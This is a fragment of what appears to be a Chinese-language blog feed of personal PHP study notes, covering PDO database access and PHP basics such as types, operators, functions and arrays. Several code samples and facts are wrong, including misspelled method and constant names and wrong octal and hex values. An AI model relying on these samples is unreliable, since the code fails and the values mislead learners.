class="headerlink" title="1.连接数据库"></a><strong>1.连接数据库</strong></h4><pre><code class="hljs">$DSN = &quot;mysql: host=服务器地址；port=端口号；dbname=数据库名&quot;；$Options = array(PDO::MYSQL_ATTR_INIT_COMMADN =&gt; &#39;set names utf8&#39;); $pdo = new pdo($DNS,用户名,密码,$Options);</code></pre><p>DSN : Data Source Name</p><h4 id="2-执行SQL语句"><a href="#2-执行SQL语句" class="headerlink" title="2.执行SQL语句"></a><strong>2.执行SQL语句</strong></h4><pre><code class="hljs">$result1 = $pdo-&gt;exec(增删改语句)；$result2 = $pdo-&gt;query(各种sql语句)；</code></pre><p>exec 习惯上执行没有返回结果集的语句，返回值为 受影响的行数，当然也可能返回false</p><p>query 执行select 这种有返回结果集的语句，执行失败返回false,成功的话返回的结果集还需要进一步的处理。</p><h4 id="3-断开连接"><a href="#3-断开连接" class="headerlink" title="3.断开连接"></a><strong>3.断开连接</strong></h4><pre><code class="hljs">$pdo = null;</code></pre><h3 id="6-POD-的错误处理"><a href="#6-POD-的错误处理" class="headerlink" title="6.POD 的错误处理"></a><strong>6.POD 的错误处理</strong></h3><p>PDO 的错误处理有两种模式：</p><p><strong>(1)静默模式:</strong></p><p>发生错误以后并不会产生任何提示，需要人为的通过代码获取</p><p><strong>示例代码：</strong></p><pre><code class="hljs">$pdo-&gt;exec($sql);$code = $pdo-&gt;errorCode();//获取上一行代码执行的错误，如果没有错误则返回0、if($code == 0)&#123;    echo &quot;执行成功&quot;;&#125;else&#123;    $info = $pdo-&gt;errorInfo();    echo &quot;失败,错误代号：&quot;.$info[2];&#125;</code></pre><p><strong>(2)异常模式:</strong>、</p><p><strong>示例代码：</strong></p><pre><code class="hljs">try&#123;    $pdo-&gt;exec($sql);&#125;catch(Exception $e)&#123;    echo &quot;发生错误，请参考错误提示：&quot;.$e-&gt;GetMessage();&#125;</code></pre><h3 id="7-POD-的结果集对象"><a href="#7-POD-的结果集对象" class="headerlink" title="7.POD 的结果集对象"></a><strong>7.POD 的结果集对象</strong></h3><h4 id="1-得到结果集对象："><a href="#1-得到结果集对象：" class="headerlink" title="1.得到结果集对象："></a><strong>1.得到结果集对象：</strong></h4><pre><code class="hljs">$res = $pdo-&gt;query(&quot;select ...&quot;);</code></pre><h4 id="2-常见处理方法"><a href="#2-常见处理方法" class="headerlink" title="2.常见处理方法"></a><strong>2.常见处理方法</strong></h4><p><strong>得到行数</strong></p><pre><code class="hljs">$res-&gt;rowCount();</code></pre><p><strong>得到列数</strong></p><pre><code class="hljs">$res-&gt;columnCount();</code></pre><p><strong>返回一行数据（结果是一维数组）</strong></p><pre><code class="hljs">$res-&gt;fetch(返回类型)</code></pre><p>返回类型：</p><p>PDO::FETCH_ASSOC 返回关联数组<br>PDO::FETCH_NUM 返回索引数组<br>PDO::FETCH_BOTH 返回前两者皆有的数据（默认值）、<br>PDO::FETCH_OGJ 返回对象</p><p><strong>返回所有数据（结果二维数组）</strong></p><pre><code class="hljs">$res-&gt;fetchAll(返回类型);</code></pre><p><strong>返回指定的列</strong></p><pre><code class="hljs">$resds-&gt;fetchColumn([$i]);</code></pre><p>返回第i列</p><h3 id="8-POD-结果集对象的预处理语法、"><a href="#8-POD-结果集对象的预处理语法、" class="headerlink" title="8.POD 结果集对象的预处理语法、"></a><strong>8.POD 结果集对象的预处理语法</strong>、</h3><h4 id="1-为什么需要预处理"><a href="#1-为什么需要预处理" class="headerlink" title="1.为什么需要预处理"></a><strong>1.为什么需要预处理</strong></h4><p>一般的sql 语句一条一条的执行是没有任何的问题的，但是如果我们希望大量的 sql语句批量的执行的话就会显得效率不足，于是我们就可以使用预处理语句来提升我们的执行效率，</p><p><strong>但是前提是：</strong><br>这些语句有一定的规律性，其中只有部分参数变化</p><h4 id="2-形式："><a href="#2-形式：" class="headerlink" title="2.形式："></a><strong>2.形式：</strong></h4><p><strong>形式一：占位符形式</strong></p><p>参数的顺序一次是 1,2,3,4,5</p><pre><code class="hljs">$sql = &quot;select * from user_list where age = ?&quot;;</code></pre><p><strong>示例代码：</strong></p><pre><code class="hljs">$arr = array(11,28,32);$sql = &quot;select * from user_list where age = ?&quot;;$result = $pdo-&gt;prepare($sql);foreach($arr as $value)&#123;    $result-&gt;bindVaule(1,$value);//如果有多个问号就可以有多个语句    $result-&gt;execute();    $result = $rersult-&gt;fetch(PDO::FETCH_ASSOC);    print_r($result);&#125;</code></pre><p><strong>形式二：命名参数形式</strong></p><pre><code class="hljs">$sql = &quot;select * from user_list where age= :v1&quot;;</code></pre><p><strong>示例代码：</strong></p><pre><code class="hljs">$sql = &quot;select * from user_list where age = :v1 and edu = :v2&quot;;    $result = $pdo-&gt;prepare($sql);    $result-&gt;bindVaule(&quot;:v1&quot;,11);    $result-&gt;bindVaule(&quot;:v2&quot;,&quot;高中&quot;);    $result-&gt;execute();    $result = $rersult-&gt;fetch(PDO::FETCH_ASSOC);    print_r($result);</code></pre>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程 PHP 进阶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP 基础教程（漫谈）</title>
    <link href="/2018/10/05/PHP%20%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%EF%BC%88%E6%BC%AB%E8%B0%88%EF%BC%89/"/>
    <url>/2018/10/05/PHP%20%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%EF%BC%88%E6%BC%AB%E8%B0%88%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>之前学习php的时候随手记下来的笔记（<strong>应该是PHP5.x版本相对老，有些可能在php7中已经修改或者弃用</strong>），比较散，现在复习一下，于是就顺手整理一下并修改了一些错误和补充了一些内容。</p><h2 id="1-关于-PHP-文件的解析"><a href="#1-关于-PHP-文件的解析" class="headerlink" title="1.关于 PHP 文件的解析"></a><strong>1.关于 PHP 文件的解析</strong></h2><span id="more"></span><p>(1) php的文件后缀是**由apache配置文件（.htaccess）**决定的，他决定让PHP应用服务器用解析什么后缀作为php<br>(2) phpinfo(); 看到php 运行环境的所有参数<br>(3) php 文件中可以嵌套很多种脚本语言，html css javascript 等，<code>&lt;?php?&gt;</code> 之外的都是直接发送给客户端，里面的php代码应用服务器解析后再发送给客户端</p><h2 id="2-语言标记"><a href="#2-语言标记" class="headerlink" title="2.语言标记"></a><strong>2.语言标记</strong></h2><p><code>&lt;?php ?&gt;</code> ——————&gt;推荐使用<br><code>&lt;?    ?&gt;</code>——————-&gt;PHP 的短标签(需要php.ini中开启 short_open_tag &#x3D; On)<br><code>&lt;?=$var?&gt;</code>——————&gt;PHP 的短标签相当于 <?php echo $var ?>(需要php.ini中开启 short_open_tag &#x3D; On)<br><code>&lt;%     %&gt;</code>——————&gt;ASP风格（此种风格需要在配置文件php.ini中启用asp_tag选项)<br><code>&lt;script language=&quot;php&quot;&gt; &lt;/script&gt;</code> ———-&gt;javascript 风格，在一些绕过中比较有用</p><h2 id="3-指令分隔符"><a href="#3-指令分隔符" class="headerlink" title="3.指令分隔符"></a><strong>3.指令分隔符</strong></h2><p>语句分为两种，一种是 功能执行语句 后面一定要加分号，一种是结构定义语句 后面一定不能加分号。</p><blockquote><p>**注意：**与?&gt;最近的一条语句可以不加分号</p></blockquote><h2 id="4-注释"><a href="#4-注释" class="headerlink" title="4.注释"></a><strong>4.注释</strong></h2><p>&#x2F;&#x2F;   ———————&gt;单行<br><code>/* */</code>——————&gt;多行<br># ———————-&gt;脚本注释<br><code>/** */</code> —————-&gt;文档注释</p><blockquote><p><strong>注意：</strong></p><p>1.注释与代码比例应该是1:1<br>2.不合适的代码不要删掉，先注释掉，方便以后修改<br>3.注释方便自己和他人的阅读理解<br>4.注释可以用来调试程序<br>5.注释写在代码的上面或者右边</p></blockquote><p><strong>特别强调：</strong></p><p>当?&gt;之后就是文件结尾的时候，可以不要这个东西，并且建议不加这个东西，因为在文件包含的时候，一些头函数 session cookie 什么的前面一定不能有空白，但是你在?&gt;之后可能会不经意后回车什么的产生，这样包含的程序就会出错，不加一直到文件尾的全部都认为是php代码，不会有事。</p><h2 id="5-变量"><a href="#5-变量" class="headerlink" title="5.变量"></a><strong>5.变量</strong></h2><p><strong>1.php可以用关键字命名</strong><br>2.开头不可以是数字或者运算符号**（变量名的第一个字符已经扩展为 [a-zA-Z_\x7f-\xff] ）**<br>3.需要输出多次，或者可能会修改那就用变量<br>4.<code>$变量名=值</code>  没有类型，因为php是弱类型的语言，变量类型由存储的内容决定<br><strong>5.PHP可以连续赋值</strong><br>6.php变量和常量区分大小写，但是其他不区分<br>7.PHP变量名要有意义，<br>8.命名习惯是第一个单词首字母小写，其余首字母大写$aaaBbbCcc**（驼峰式命名法）**</p><h2 id="6-可变变量"><a href="#6-可变变量" class="headerlink" title="6.可变变量"></a><strong>6.可变变量</strong></h2><p><strong>可变变量比较容易出现变量覆盖的问题</strong></p><pre><code class="hljs">$one=&quot;aaa&quot;;$a=&quot;one&quot;;$$a=? ---&gt;aaa</code></pre><h2 id="7-引用赋值"><a href="#7-引用赋值" class="headerlink" title="7.引用赋值"></a><strong>7.引用赋值</strong></h2><p>类似于C指针</p><pre><code class="hljs">$a=&amp;$b;</code></pre><h2 id="8-类型"><a href="#8-类型" class="headerlink" title="8.类型"></a><strong>8.类型</strong></h2><p>整型 浮点型 布尔型 字符型</p><p>复合类型 –》数组 类</p><p>资源类型 –》 如fopen()</p><p>var_dump()可以查看类型</p><h2 id="9-变量声明"><a href="#9-变量声明" class="headerlink" title="9.变量声明"></a><strong>9.变量声明</strong></h2><pre><code class="hljs">$int=10 十进制$int=045 八进制  375$int=0xff 十六进制 25$int=3e5  300000</code></pre><p><strong>整数的最大值是4字节 2的32次方</strong></p><p><strong>以下都是假</strong></p><pre><code class="hljs">$bool=false;$bool=0;$bool=0.00;$bool=&quot;&quot;;$bool=&quot; &quot;;$bool=&quot;0&quot;$bool=array();$bool=null</code></pre><h2 id="10-字符串的声明"><a href="#10-字符串的声明" class="headerlink" title="10.字符串的声明"></a><strong>10.字符串的声明</strong></h2><p>1.单双引号能声明字符串<br>2.字符串没有长度限制<br>3.在<strong>双引号</strong>声明的字符串中既<strong>可以直接解析变量</strong>，又可以使用转义字符<br>4.在<strong>单引号</strong>声明的字符串中<strong>不可以</strong>直接解析变量，也不可以使用转义字符（转义字符\只能用来转义他自己，和单引号）</p><p><strong>5. 字符串中嵌套变量</strong></p><pre><code class="hljs">echo &quot;asdada$int sdadadadadasdadas$int dasdsadsadadadadasda&quot;;</code></pre><p>这里面解析变量是要有空格的，输出的时候也有，因为合在一起区分不了变量。<strong>解决方法是在变量外面加大括号</strong></p><pre><code class="hljs">echo &quot;asdada&#123;$int&#125;sdadadadadasdadas&#123;$int&#125;dasdsadsadadadadasda&quot;;</code></pre><p>或者</p><pre><code class="hljs">echo &quot;asdada$&#123;int&#125;sdadadadadasdadas$&#123;int&#125;dasdsadsadadadadasda&quot;;</code></pre><p>6.双引号中不能使用双引号，单引号中不能使用单引号</p><blockquote><p><strong>注意：</strong></p><p>最好使用单引号，越简单的东西浪费的资源越少，开发中有大量的输出，除非需要的时候用双引号</p></blockquote><p>7.定界符声明字符串</p><pre><code class="hljs">$str=&lt;&lt;&lt;padkladaaksdak&#39;&#39;a&#39;&#39;&quot;&quot;&quot;sad&#39;&quot;&quot;a&#39;‘’asdad&#123;$int&#125;dad\nadad\t\\adadaad\rp;</code></pre><p>这里的p是自定义的，第一个后面不能有任何符号包括空格，第二个前面不能有任何符号，包括空格。<br>定界符里面能解析变量，转义字符，单引号双引号</p><h2 id="11-PHP的特性"><a href="#11-PHP的特性" class="headerlink" title="11.PHP的特性"></a><strong>11.PHP的特性</strong></h2><p>会把多个0当成一个0</p><h2 id="12-浏览器特性"><a href="#12-浏览器特性" class="headerlink" title="12.浏览器特性"></a><strong>12.浏览器特性</strong></h2><p>会把多个空格解析为一个空格比如在字符串里面有一个\t,页面只会显示一个空格，但是源码里面很多个\n页面也是只有一个空格，源码里出现回车。</p><h2 id="13-变量类型转换"><a href="#13-变量类型转换" class="headerlink" title="13.变量类型转换"></a><strong>13.变量类型转换</strong></h2><h3 id="一种是强制转换"><a href="#一种是强制转换" class="headerlink" title="一种是强制转换"></a><strong>一种是强制转换</strong></h3><pre><code class="hljs">setType(变量名，类型)</code></pre><p>类型有 int iteger float double real bool boolean string array object</p><p>settype() 这个函数是将原变量的类型转换，</p><pre><code class="hljs">$val=intval(变量或值)$val=floatval(变量或值)$val=stringval(变量或值)$a=(int)&quot;100.131231asdad&quot;</code></pre><blockquote><p><strong>注意：</strong></p></blockquote><blockquote><p>1.转换的时候一定要注意数字的范围<br>整数占4个字节，浮点数占8个字节，那么超过四个字节转换成整数就会出现溢出 整数最大是 2.147483648e9<br>超过或者等于这个值就会出错。</p></blockquote><blockquote><p>2.字符串转换的时候注意，开头是数字的字符串，转化成整型就会截取前面的数字，但是后面的不会有，纯粹&gt;的字符换或者空字符都会转化成0</p></blockquote><h3 id="另一种是自动转换"><a href="#另一种是自动转换" class="headerlink" title="另一种是自动转换"></a><strong>另一种是自动转换</strong></h3><p>这种用的比较多，因为这种情况下我们开发的时候不用管理类型，他会根据环境自动转换。</p><p><strong>示例代码：</strong></p><pre><code class="hljs">$a=&quot;100.123123adaddda&quot;;$b=2.147483648e9;$c=10;$d=true;echo $sum=$a+$b+$d+$c;2147483759.1231</code></pre><h2 id="14-和变量有关的一些函数"><a href="#14-和变量有关的一些函数" class="headerlink" title="14.和变量有关的一些函数"></a><strong>14.和变量有关的一些函数</strong></h2><p>gettype(变量名) 得到类型<br>isset() null 代表不存在 但是” “代表存在 ‘’代表存在<br>empty() “ “代表不为空</p><h2 id="15-变量类型测试函数"><a href="#15-变量类型测试函数" class="headerlink" title="15.变量类型测试函数"></a><strong>15.变量类型测试函数</strong></h2><pre><code class="hljs">is_bool()is_int() is_integer() is_long()is_float()  is_double()  is_real()is_array()is_resource()is_object()is_scalar() -------------&gt;是否是标量，整型，字符串，浮点型，布尔is_numberic()is_callable() -----------&gt;检查类中的方法是否可被调用（当然先检查是否存在)method_exists() ----------&gt;只会检查是否存在，能不能调用不关他的事print_r()打印数组echo 打印普通变量</code></pre><h2 id="16-常量"><a href="#16-常量" class="headerlink" title="16.常量"></a><strong>16.常量</strong></h2><p>常量用 define(“常量名”，值)定义，</p><p>常量使用范围比变量更广，在全局定义的变量在子函数中找不到，不能用除非 使用时在前面加 global $a 但是常量只要在全局定义记就没有限制。</p><p>常量定义以后就不能修改，也不能用unset取消，</p><p>常量在任何时候都不加$</p><p>常量的值只能是标量，（四种）</p><p>defined判断常量是否存在</p><p>预定义常量和魔术常量</p><pre><code class="hljs">预定义M_PI 魔术 __FILE__</code></pre><h2 id="17-运算符"><a href="#17-运算符" class="headerlink" title="17.运算符"></a><strong>17.运算符</strong></h2><h3 id="1-算术运算符"><a href="#1-算术运算符" class="headerlink" title="1.算术运算符"></a><strong>1.算术运算符</strong></h3><p>% 有两个目的</p><p>1.用来整除<br>2.用来控制数字大小</p><blockquote><p><strong>注意：</strong></p><p>使用时，他会把他两边的数全部转化成整数再进行运算，因此不要用小数取余也尽量不要用负数</p></blockquote><h3 id="2-字符串运算符"><a href="#2-字符串运算符" class="headerlink" title="2.字符串运算符 ."></a><strong>2.字符串运算符 <code>.</code></strong></h3><p>不仅可以把两个字符串连接成新的字符串，还可以把一个任意标量和一个字符串连接成新的字符串。</p><h3 id="3-赋值运算符"><a href="#3-赋值运算符" class="headerlink" title="3.赋值运算符"></a><strong>3.赋值运算符</strong></h3><p>&#x3D; +&#x3D; -&#x3D; 、&#x3D; *&#x3D; %&#x3D;  .&#x3D;</p><p>赋值运算符左边必须是变量，右边是表达式</p><h3 id="4-比较运算符"><a href="#4-比较运算符" class="headerlink" title="4.比较运算符"></a><strong>4.比较运算符</strong></h3><p>&#x3D;&#x3D; &lt;&gt; !&#x3D;  &#x3D;&#x3D;&#x3D; !&#x3D;&#x3D;</p><blockquote><p><strong>注意：</strong></p><p>这里面不要用一个等于号，那个是赋值语句 特别注意这个！&#x3D;&#x3D; 这个叫恒不等于，他当数值相同但是类型不相同的时候 会返回真，但是！&#x3D; 在这种情况下就会返回假。换句话说只要有一个不相等就会返回真。</p></blockquote><h3 id="5-逻辑运算符"><a href="#5-逻辑运算符" class="headerlink" title="5.逻辑运算符"></a><strong>5.逻辑运算符</strong></h3><p>&amp;&amp; and  || or ！ not </p><p>处理的都是bool 返回的也是bool</p><p>同一级不要出现不同的运算符混合，最好要加括号</p><h3 id="6-位运算"><a href="#6-位运算" class="headerlink" title="6.位运算"></a><strong>6.位运算</strong></h3><pre><code class="hljs">&amp; | ^ ~ &lt;&lt; &gt;&gt; &gt;&gt;&gt;位运算会把左右的字符串转化成ascll  会把浮点数转化成整数 进=进行二进制的运算&gt;&gt;2相当于除以4 &lt;&lt;2相当于乘以4&gt;&gt;&gt;无符号右主要是跨平台用</code></pre><blockquote><p>注意：</p><p>&amp; | 既可以做位运算符也可以做逻辑运算符，但是这里面有着很大的区别。</p></blockquote><h3 id="7-短路问题："><a href="#7-短路问题：" class="headerlink" title="7.短路问题："></a><strong>7.短路问题：</strong></h3><p>使用&amp;&amp; || 会存在短路问题，会有一遍可能不执行，但是 &amp; | 两边都要执行完毕不会出现短路问题</p><p>``可以执行系统命令  echo `ipconfig`;</p><p>@ 可以消除错误提示 @gettype()</p><blockquote><p>**提醒：**用括号改变优先级比较好</p></blockquote><h2 id="18-函数"><a href="#18-函数" class="headerlink" title="18.函数"></a><strong>18.函数</strong></h2><h3 id="1-定义："><a href="#1-定义：" class="headerlink" title="1.定义："></a><strong>1.定义：</strong></h3><p>函数是被独立命名的，独立的代码段，他执行特定的任务，并可以给调用它的程序返回一个值传进函数的变量在函数中改变并不会影响该变量的值，这和c语言是一样的，除非你传进去的就是地址。</p><h3 id="2-函数的优点"><a href="#2-函数的优点" class="headerlink" title="2.函数的优点"></a><strong>2.函数的优点</strong></h3><p>(1)提高程序的重用性<br>(2)提高程序的可维护性<br>(3)提高软件的开发效率<br>(4)提高软件的可靠性<br>(5)控制程序的复杂性</p><h3 id="3-函数的声明"><a href="#3-函数的声明" class="headerlink" title="3.函数的声明"></a><strong>3.函数的声明</strong></h3><pre><code class="hljs">function 函数名(参数1,2,3)&#123;函数体；返回值；&#125;</code></pre><blockquote><p><strong>注意：</strong></p><p>一.函数必须调用才能执行，函数调用可以在声明前也可以在声明后 二.函数名和变量名一样，aa bb cc aaBbb<br>三.php没有命名空间的概念，因此函数在声明时绝对不能重名。（不仅和自己，还要和系统函数）<br>四.可以通过像函数传递参数来改变函数的行为，括号里面的变量和内部定义的变量是一样的，都是局部的。唯一不同的是，他可以在调用时赋值，里面的变量不可以<br>五.没有返回值就成为过程 六.我们把所有的返回值全部存到一个变量里面，然后返回这个变量，谁调用的他，就要返回到谁那里去。<br>七.函数执行到return就停止了，因此后面不要写语句。</p></blockquote><h3 id="4-可变函数"><a href="#4-可变函数" class="headerlink" title="4.可变函数"></a><strong>4.可变函数</strong></h3><p>变量（） php会寻找和变量值同名的函数</p><h3 id="5-编写函数的规范"><a href="#5-编写函数的规范" class="headerlink" title="5.编写函数的规范"></a><strong>5.编写函数的规范</strong></h3><p>在编写函数的时候应该说明以下几点：<br>1.函数的功能<br>2.函数的参数<br>3.函数的返回值</p><p>php有2000多个系统函数，同样的功能你能写出来但是一定要使用系统函数，执行效率更高</p><p>函数的参数都是以  <strong>类型 + 值</strong> 的方式写入的（声明时）</p><h3 id="6-函数的分类"><a href="#6-函数的分类" class="headerlink" title="6.函数的分类"></a><strong>6.函数的分类</strong></h3><p><strong>1.常规函数</strong></p><pre><code class="hljs">bool copy(string source ,string dest)</code></pre><p><strong>2.带有mixed</strong></p><p>mixed表示可以传入任意类型的参数</p><pre><code class="hljs">bool chown(string filename,mixed user)</code></pre><p><strong>3.带有&amp;的参数</strong></p><p>表示引用赋值，必须传入一个变量，传进去的变量在函数中操作的是地址，直接就会被改变。</p><pre><code class="hljs">bool arrest(array &amp;array [,int sort_flag])</code></pre><p><strong>4.带有中括号的参数</strong></p><p>这种参数是可选的，如果你传入了值，就按照你传入的值用没传值，就用默认值。</p><pre><code class="hljs">bool arrest(array &amp;array [,int sort_flag])</code></pre><p><strong>怎么做到这样子呢？？</strong></p><p>只要在定义的时候传进去默认值就行了。</p><pre><code class="hljs">function($a,$b,$c=10)&#123;&#125;</code></pre><p>这个时候如果第三个参数不传值，那么会用默认的10</p><p><strong>注意：在设置的时候可选值绝对不能放在必须值得前面</strong></p><p><strong>5.带有…的参数的函数</strong> </p><p>…表示可以穿任意多个参数</p><pre><code class="hljs">int arry_unshift (array &amp; array ,mixed var [,mixed...])</code></pre><p><strong>6.回调函数</strong>  </p><p>带有callback参数的函数，就是调用这个函数我们需要传递一个函数进来(函数名)，</p><pre><code class="hljs">array array_filter(array input [,callback callback])</code></pre><p><strong>7.内部函数</strong></p><p>可以再函数内部再次声明函数，目的就是在函数的内部调用，用来帮助外部函数完成一些子功能。</p><p><strong>8.递归函数</strong></p><p>在自己内部调用自己</p><p><strong>9.系统函数</strong></p><h2 id="19-PHP-变量的范围"><a href="#19-PHP-变量的范围" class="headerlink" title="19.PHP 变量的范围"></a><strong>19.PHP 变量的范围</strong></h2><p><strong>局部变量</strong>：在函数内部声明的变量就是局部变量，只能在函数内部使用。<br><strong>全局变量</strong>：在函数外声明，声明后整个脚本结束前都可以使用的包括在函数中和{}中都可以使用。</p><blockquote><p><strong>注意：</strong><br>(1)php的变量分不出是声明还是调用，不像js 声明是var 变量,调用直接就是变量<br>(2)在php中使用全局变量要通过global 关键字将这个全局变量包含到这个函数中，目的是告诉函数你使用的这个变量是全局而不是函数内部的（global声明之后用的才是全局的）</p></blockquote><h2 id="20-php中的静态变量"><a href="#20-php中的静态变量" class="headerlink" title="20.php中的静态变量"></a><strong>20.php中的静态变量</strong></h2><p>静态变量只能在函数中或者是类中声明，不能在全局声明。<br>使用static 在变量前</p><blockquote><p><strong>作用：</strong> 一个变量可以在同一个函数多次调用中重用</p><p>1.静态变量在静态代码段中保存<br>2.一个函数在多次调用之间重用，但是只在第一次调用函数时声明到内存，以后再调用就不再声明，直接使用<br>3.静态变量只能初始化为一个字符值或者一个常量，不能是表达式，即使变量定义时没有赋初值，系统也会自动赋值为零，或者是空字符。</p></blockquote><h2 id="21-包含文件"><a href="#21-包含文件" class="headerlink" title="21.包含文件"></a><strong>21.包含文件</strong></h2><h3 id="1-常见的四种方法："><a href="#1-常见的四种方法：" class="headerlink" title="1.常见的四种方法："></a><strong>1.常见的四种方法：</strong></h3><p>require 可以重复包含<br>inculde<br>require_once 自动检测是否重复包含，并且只能包含一次<br>incukde_once</p><p><strong>注意：这些都是系统指令，都有两种用法，</strong></p><p><strong>比如：</strong> </p><p>include(“文件名”)；<br>include “文件名”；</p><p>echo（”@@@@@@@@@@@@@@@@@”）;<br>echo “@@@@@@@@@@@@@@@@@@”;</p><p><strong>这种包含不是直接拷贝（因为很多都不是php的语法），而是当成php解析后输出的代码</strong></p><p>我们知道在PHP中是没有命名空间的，所以一个函数名不能定义两次，也就是如果文件中有定义函数的内容那么这个文件就不能被包含两次，这就是include_once和require_once存在的意义</p><p>但是，功能多的函数效率一定比较低。建议使用不带once的</p><h3 id="2-require-和-inculde的区别是"><a href="#2-require-和-inculde的区别是" class="headerlink" title="2.require 和 inculde的区别是"></a><strong>2.require 和 inculde的区别是</strong></h3><p>require 是静态包含，就是确定要包含什么<br>include 是动态包含  被包含内容可能有变量。</p><h2 id="22-数组"><a href="#22-数组" class="headerlink" title="22.数组"></a><strong>22.数组</strong></h2><h3 id="一-数组的概述"><a href="#一-数组的概述" class="headerlink" title="一.数组的概述"></a><strong>一.数组的概述</strong></h3><p>1.数组的本质：管理和操作一组变量，成批处理<br>2.数组是复合类型<br>3.数组中可以存储任意长度的数据，存储任意类型数据<br>4.php 中的数组就可完成其他语言数据结构的功能（链表，队列，栈，集合等）</p><h3 id="二、数组的分类"><a href="#二、数组的分类" class="headerlink" title="二、数组的分类"></a><strong>二、数组的分类</strong></h3><p>数组中有多个单元（单元称为元素）<br>每个元素（下标[键]，值）<br>单独访问元素的时候，都是通过下标来访问的</p><p>1.一维，二二维，三维，多维数组（数组的数组）<br>2.PHP中有两种数组</p><p>①索引数组：下标是顺序整数作为索引的<br>②关联数组：下标是字符串作为索引的</p><p>下标（整数，字符串）只有这两种</p><h3 id="三、数组的声明方式"><a href="#三、数组的声明方式" class="headerlink" title="三、数组的声明方式"></a><strong>三、数组的声明方式</strong></h3><p><strong>1.直接为数组元素赋值</strong></p><pre><code class="hljs">a.这种情况下可以不给索引，那么他会按照顺序一个一个的赋值b.如果突然在中间给了一个值的索引，后面的就会从所给的索引值加一开始c.如果后面给了两个索引值，那么会从最大的值加一开始d.关联数组的就是把数字改成字符串就行了e.混合声明两者互不影响。</code></pre><p><strong>2.使用array函数赋值</strong></p><pre><code class="hljs">a.默认是索引数组b.用“键”=&gt;值  使之成为关联数组c.二或多维数组多个数组成员之间用逗号隔开d.把二维数组香香成一个表格，那么三维数组就是三个表格</code></pre><p><strong>3.使用其他元素赋值</strong>   、</p><p>如file()会把文件内容的每一行存到一个数组里面。</p><h3 id="四、数组的遍历"><a href="#四、数组的遍历" class="headerlink" title="四、数组的遍历"></a><strong>四、数组的遍历</strong></h3><p><strong>1.for语句循环遍历</strong></p><pre><code class="hljs">a.其他语言只有这一种方式（首选）b.php里面这种方式并不是首选的c.用这种方式遍历数组必须是索引数组，并且下标必须连续</code></pre><p><strong>2.foreach 语句循环遍历</strong><br><br>    foreach(数组变量 as 变量值)<br>    {<br>    循环体；<br>    }</p><pre><code class="hljs">a.循环的次数由数组的元素个数决定，有几个循环几次b.每一次的循环都会将数组中的元素分别赋值给后面的变量c.如果是关联数组，还想知道键值那么可以使用它的第二种形式foreach(数组变量 as 变量1=&gt;变量2)&#123;echo 变量1 .&quot;===&gt;&quot;.变量2 ；&#125;变量1存键值  变量2存值</code></pre><p><strong>3.while() 和each() 或 list()  结合使用</strong></p><p><strong>each()函数</strong></p><pre><code class="hljs">a. 需要一个数组作为参数b. 返回值也是一个数组c. 返回的数组是0,1 key value 四个固定的下标   0和key 是当前数组元素的键   1和value 是当前数组元素的值d.默认当前元素就是第一个元素e.每执行一次就会将当前元素向后移动f.如果到最后的元素再执行这个函数，就会返回falseg.相当于返回两个，一个是索引数组，一个是关联数组</code></pre><p><strong>list()函数</strong><br><br>a. list($a,$b,$c…)&#x3D;array(1,2,3,…);<br>b. 数组中的元素个数要和list中的元素个数相同，如果只想打印一个，其他两个变量的位置也要空出来<br>c. 数组中的给每个元素会赋值给list()中的每个参数，list()会把每个值转化成变量<br>d. list() 只能接受索引数组，并且按照索引的下标从小到大的顺序。<br><br>while(list($key,$value)&#x3D;each($usr))<br>{<br>echo $key.”&#x3D;&#x3D;&#x3D;&#x3D;&gt;”.$value.”<br>“;<br>}</p><pre><code class="hljs">但是这个还是有弊端，因为each()执行一次指针就会跑到最后下一次再使用就不行了，下面介绍已解决办法</code></pre><p><strong>使用数组的内部指针控制函数</strong></p><p>next(数组)<br>prev(数组)<br>reset(数组)<br>end(数组)</p><p>current(数组)  取当前元素<br>key(数组)  取当前键值</p><h3 id="五、超全局数组"><a href="#五、超全局数组" class="headerlink" title="五、超全局数组"></a><strong>五、超全局数组</strong></h3><p>预定义数组</p><p>自动全局变量 —- 超全局数组</p><p>1.包含了来自web服务器，客户端，运行环境以及用户输入的数据<br>2.他们在全局范围内自动生效，都可以直接使用这些数组<br>3.用户不能自定义这些数组，&#x3D;但是操作方式和原来一样。</p><pre><code class="hljs">$_GET$_POST$_REQUEST//经由get post cookie 提交的数据都可以由他来接受，因此该数组不值得信任，最好不要使用. $_FILES//经由 http post方法提交至脚本的文件$_COOKIES$_SERVER$_ENV//服务器，操作系统的环境信息$_SESSION//变量由web服务器设定，或者直接和当前的执行环境有关$GLOBALS//只要是当前脚本有效的变量都在里面，数数组键名为全局变量的名称</code></pre><blockquote><p><strong>注意：</strong></p><p>不要用变量来接受请求的参数，这种输进去的参数可以直接被转化成变量，那样带会来安全隐患，并且一般管理员并不打开自动注册为全局变量的选项</p></blockquote><p><strong>为什么不能一直使用get请求？</strong></p><p>因为get请求是在地址栏里面的，而地址栏是有限长度的，最长是8092字节，并且明文显示是很不安全的。</p><h3 id="六、数组的相关处理函数"><a href="#六、数组的相关处理函数" class="headerlink" title="六、数组的相关处理函数"></a><strong>六、数组的相关处理函数</strong></h3><h4 id="1-和数组键值相关的函数"><a href="#1-和数组键值相关的函数" class="headerlink" title="1.和数组键值相关的函数"></a><strong>1.和数组键值相关的函数</strong></h4><pre><code class="hljs">1.array_values()返回数组中所有的值并返回数字索引2.array_keys() 返回数组中的键值，有两个可选参数，可以指定返回那个值得键值，第三个参数可以指定第二个参数是否需要严格按照类型进行匹配，严格true不严格就是false。3.in_array()判断第一个参数是不是在数组中（第二个参数）还有第三个参数用来判断类型。4.array_key_exists() 判断键值是否存在与数组当中。5.array_flip(数组)交换数组中的键和值（但是注意如果不同的键值对应同一个值得话，反过来同一个键值对应着不同的值，那么后面的就会把前面的覆盖）6.array_reverse()把数组对调，</code></pre><h4 id="2-统计数组元素个数和唯一性"><a href="#2-统计数组元素个数和唯一性" class="headerlink" title="2.统计数组元素个数和唯一性"></a><strong>2.统计数组元素个数和唯一性</strong></h4><pre><code class="hljs">1.count()  sizeof()2.array_count_values() 统计数组中值出现的次数，返回一个数组。3.array_unique()移除数组中重复的值，返回一个没有重复值得数组</code></pre><h4 